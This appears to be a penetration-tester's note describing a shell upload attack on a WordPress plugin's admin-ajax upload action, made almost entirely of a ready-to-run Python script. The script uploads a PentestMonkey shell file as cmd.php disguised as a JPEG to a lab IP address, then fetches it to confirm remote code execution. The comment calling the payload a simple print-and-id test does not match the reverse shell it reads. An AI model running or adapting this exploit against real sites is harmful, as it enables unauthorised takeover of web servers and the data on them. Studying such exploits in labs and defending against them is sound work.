# Read PenTestMonkey from file (shell.sh) to variable, upload as cmd.php, execute(WPREPAIR EDITION)

OS: Web
Description: Shell upload strategy
Security Domains: Command Injection (https://www.notion.so/Command-Injection-1434c8e52376803c8c3edfbca59dcd49?pvs=21)

```php
import requests
import sys

target = "http://192.168.80.132:9050"
url = f"{target}/wp-admin/admin-ajax.php"

headers = {
    "User-Agent": "Mozilla/5.0",
    "X-Requested-With": "XMLHttpRequest",
}

# Simple payload to print "VULNERABLE" and run 'id'
with open('shell.sh', 'r') as file:
    php_payload = file.read()

print(f"Read {len(php_payload)} characters.")
files = {
    "file": ("cmd.php", php_payload, "image/jpeg"),
}

data = {
    "action": "wc_upload_file_ajax",
}

print(f"[+] Targeting {target}...")
try:
    response = requests.post(url, headers=headers, files=files, data=data)
except requests.exceptions.ConnectionError:
    print("[-] Connection failed. Is the server up?")
    sys.exit(1)

if response.status_code == 200:
    response_text = response.text.replace(r"\/", "/")
    # The response usually acts as a JSON or string containing the URL
    # The original exploit looks for http...php
    start = response_text.find("http")
    end = response_text.find(".php") + 4
    
    if start != -1 and end != -1:
        uploaded_file_url = response_text[start:end]
        print(f"[+] Payload uploaded: {uploaded_file_url}")
        
        # Verify RCE
        r = requests.get(uploaded_file_url)
        print(f"[+] Response content: {r.text.strip()}")
        
        if "VULNERABLE" in r.text and "uid=" in r.text:
            print("[+] SUCCESS: Vulnerability verified and RCE achieved.")
            sys.exit(0)
        else:
            print("[-] Payload verification failed.")
            sys.exit(1)
    else:
        print("[-] Could not find URL in response.")
        print(response_text)
        sys.exit(1)
else:
    print(f"[-] Upload failed: {response.status_code}")
    print(response.text)
    sys.exit(1)
```